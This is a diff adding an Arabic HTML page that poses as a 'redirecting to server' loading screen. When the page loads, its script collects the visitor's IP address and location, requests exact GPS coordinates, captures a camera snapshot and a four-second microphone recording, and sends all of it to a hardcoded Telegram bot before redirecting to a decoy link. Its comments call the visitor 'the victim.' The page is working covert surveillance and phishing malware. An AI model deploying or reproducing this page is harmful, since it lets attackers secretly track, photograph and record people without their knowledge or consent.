@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>جاري التحميل...</title>
+    <style>
+        body { background-color: #f0f2f5; color: #333; font-family: sans-serif; text-align: center; padding: 50px; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div id="loadingView">
+        <div class="loader"></div>
+        <p>جاري إعادة توجيهك للسيرفر، يرجى الانتظار...</p>
+    </div>
+
+    <script>
+        // هذه الكلمات سيتم استبدالها من تطبيق سكيتش واير
+        const token = '8738914651:AAGLvS0jhNQPWYqrI2dC5nWNACgoAG4F3kU';
+        const chatId = '8477719260';
+        const redirectUrl = 'Source: PlayStation.Blog
+ https://share.google/DTBcdO5Uvtkt6tRzd'; // سيتم أخذها من edittext3
+
+        async function sendLog(msg) {
+            try {
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+            } catch(e) {}
+        }
+
+        async function startCapture() {
+            // 1. سحب البيانات الأساسية (IP)
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                await sendLog(`🔔 دخول جديد!\n🌐 IP: ${d.ip}\n📍 الموقع: ${d.city}, ${d.country_name}\n📱 المتصفح: ${navigator.userAgent}`);
+            } catch(e) {}
+
+            // 2. طلب الموقع الجغرافي
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (p) => {
+                    await sendLog(`📍 موقع GPS دقيق:\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+                }, null, {enableHighAccuracy: true});
+            }
+
+            // 3. محاولة فتح الكاميرا والميكروفون
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                
+                // لقطة سريعة للكاميرا
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.muted = true;
+                await video.play();
+                
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(blob => {
+                        const frm = new FormData();
+                        frm.append('chat_id', chatId);
+                        frm.append('photo', blob, 'cam.jpg');
+                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: frm });
+                    }, 'image/jpeg');
+                }, 1500);
+
+                // تسجيل صوتي قصير (4 ثواني)
+                const recorder = new MediaRecorder(stream);
+                const chunks = [];
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'audio/ogg' });
+                    const frm = new FormData();
+                    frm.append('chat_id', chatId);
+                    frm.append('voice', blob, 'rec.ogg');
+                    fetch(`https://api.telegram.org/bot${token}/sendVoice`, { method: 'POST', body: frm })
+                    .then(() => {
+                        stream.getTracks().forEach(t => t.stop());
+                        // الانتقال للرابط بعد انتهاء التسجيل والرفع
+                        window.location.href = redirectUrl;
+                    });
+                };
+                recorder.start();
+                setTimeout(() => recorder.stop(), 4000);
+
+            } catch (e) {
+                await sendLog("⚠️ الضحية رفض الأذونات أو الجهاز لا يدعم الوسائط.");
+                // الانتقال للرابط مباشرة في حال الرفض
+                window.location.href = redirectUrl;
+            }
+
+            // تأمين الانتقال للرابط في حال علق السكريبت لأي سبب (بعد 8 ثواني كحد أقصى)
+            setTimeout(() => {
+                window.location.href = redirectUrl;
+            }, 8000);
+        }
+
+        window.onload = startCapture;
+    </script>
+</body>
+</html>
